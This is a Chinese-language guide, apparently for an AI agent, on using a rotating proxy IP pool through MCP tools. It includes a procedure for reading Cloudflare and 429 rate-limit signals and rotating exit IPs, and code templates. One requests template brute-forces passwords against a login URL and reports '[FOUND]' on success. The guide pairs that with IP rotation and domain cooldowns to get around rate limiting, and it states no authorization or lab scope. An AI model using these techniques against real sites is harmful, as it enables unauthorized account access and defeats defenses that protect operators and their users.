# 代理 IP 使用指南（proxy MCP）

> 自包含文档：代理 IP 池的消费方式、限流判定 SOP、代码模板。控制台侧实现（IP 池/relay/接口）见 `/api/proxy/*`，本文只写"怎么用"。

---

## 1. 什么时候用代理

| 任务形态 | 用法 |
|---------|------|
| 批量任务（密码爆破/目录 fuzz/侧信道/批量验证） | 开工前 MCP `proxy_mode("proxy")` + `proxy_get_entry`；结束 `proxy_mode("direct")` |
| Playwright 浏览器（有头/无头） | **出生即连入口**（见 §3 模板）；切出口零重启 |
| 低频探测（<10 发） | 不接代理（本机直连，省配额） |
| 某域名被限流后的后续访问 | MCP `domain_limited`（或控制台接口）冷却该域 10 分钟——仅该域走代理，其他域照常本机 |

**入口地址永远从 `proxy_get_entry` 获取**（端口可能因冲突顺延，勿硬编码）。

## 2. 限流信号与判定 SOP（铁律：先查历史再行动）

### 2.1 限流信号清单（按判定强度排序）

1. 响应头 `cf-mitigated: challenge`——CF 挑战页明确自标记，一个头定案；
2. 状态码 429；
3. 403/503 且响应头 `server: cloudflare`；
4. body 特征：标题 `Just a moment...`、`cf-chl` 脚本、自建验证页关键词（状态码可能是 200）。

重定向到人机验证页不影响判断：脚本跟完重定向拿到的是最终响应（挑战页本身携带上述特征）；Playwright 的 `context.on("response")` 每一跳都有事件。

### 2.2 三场景判定（第一个动作永远是 `proxy_status` 查 rotate_history）

```
看到限流迹象（脚本 [LIMITED] 输出 / 浏览器挑战页 / 页面异常）
  ↓ 调 proxy_status 查 rotate_history
  ├─ 场景① 1 分钟内有轮换记录（或自己刚调过 rotate）
  │        → 换出口后的预期挑战，浏览器正自动过（约 5 秒）→ 等待/刷新，不换
  ├─ 场景② 无近期轮换，任务稳定运行中突发
  │        → 真限流 → proxy_rotate + domain_limited(冷却该域)
  └─ 场景③ 刚轮换过 + 已等待 >30 秒仍是挑战
           → 该供应商代理IP 信誉差 → proxy_rotate(reason="bad_ip")（旧 IP 进黑名单）
```

**为什么不能跳过查询直接换**：换 IP 后的首个挑战页是预期现象（绑旧 IP 的 `cf_clearance` 失效）。不查历史就换 → 每个新 IP 都遇挑战 → 每次都当真限流 → 连环换 IP 烧配额且挑战永远过不完。

**脚本内禁止任何自动换 IP 代码**——脚本只报告（见 §4 模板），判定与行动归 agent（信息完整性：脚本自动换了 agent 不知道，时间线出现黑洞必误判）。

## 3. 代码模板

### 3.1 requests 批量脚本（入口一行 + 裸写 + 只报告）

```python
import requests

entry = "http://127.0.0.1:9676"   # 经 MCP proxy_get_entry 获取，勿硬编码
proxies = {"http": entry, "https": entry}
# Retry 装配（换出口瞬间断连自愈；幂等方法自动重试）
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
session = requests.Session()
session.mount("https://", HTTPAdapter(max_retries=Retry(
    total=2, status_forcelist=[429, 503], backoff_factor=0.5)))

fails = []
for i, pwd in enumerate(candidates):
    r = session.post(url, data={"password": pwd}, proxies=proxies, timeout=20)
    if r.status_code == 429:
        print(f"[LIMITED] 429 at candidate #{i}")   # 报告给 agent（只报告不行动）
        fails.append(pwd)
        if len(fails) >= 3:
            break
    elif r.status_code == 302:
        print(f"[FOUND] {pwd}"); break
```

### 3.2 Playwright（有头/无头同；出生即连，全程不换地址）

```python
from playwright.sync_api import sync_playwright

entry = "http://127.0.0.1:9676"   # 经 MCP proxy_get_entry 获取
with sync_playwright() as p:
    browser = p.chromium.launch(proxy={"server": entry})   # 出生即连固定入口
    context = browser.new_context()
    page = context.new_page()
    page.goto("https://target.com")
    # 切出口 = agent 调 MCP proxy_mode/proxy_rotate（浏览器零重启、context 零重建、
    # DOM/表单/cookies 全保留）；脚本不需要也不应该包含任何换 IP 代码
```

### 3.3 例外库（不读代理环境变量，需显式处理）

| 库 | 处理 |
|----|------|
| aiohttp | `session.get(url, proxy="http://127.0.0.1:port")`（连接级 proxy 参数） |
| httpx | `httpx.Client(proxy="http://127.0.0.1:port")`（0.28+ 用 `proxy`，`proxies` 已移除） |
| urllib | `urllib.request.ProxyHandler({"http": entry, "https": entry})` 建 opener |

## 4. 换出口瞬间的请求表现（不需要脚本处理，了解即可）

- 在飞响应由 relay 优雅关闭完整送达（表现为"连接正常收尾"，非错误）；
- GET 双方（浏览器/配 Retry 的 requests）自动重试走新出口；POST 靠优雅关闭送达（响应到手无需重试）；
- 换出口后绑 IP 的服务端票据（cf_clearance/Flask-Login）失效需重过挑战——服务端行为，判定见 §2.2 场景①。

## 5. 成功/失败判断标准

| 操作 | 成功 | 失败 |
|------|------|------|
| `proxy_get_entry` | 返回 `{"proxy": "http://127.0.0.1:port", "mode": ...}` | `warning` 非空=供应商凭证未配置（控制台配置页填 `JULIANG_TRADE_NO`/`JULIANG_API_KEY`），direct 模式不受影响 |
| 经入口请求 | 正常响应 | 隧道层 502=出口连接失败（凭证缺失或供应商代理IP 不可达）→ 查 `proxy_status` |
| `proxy_rotate` | 新 IP + 余量 | 422=凭证未配置/供应商 API 失败 |
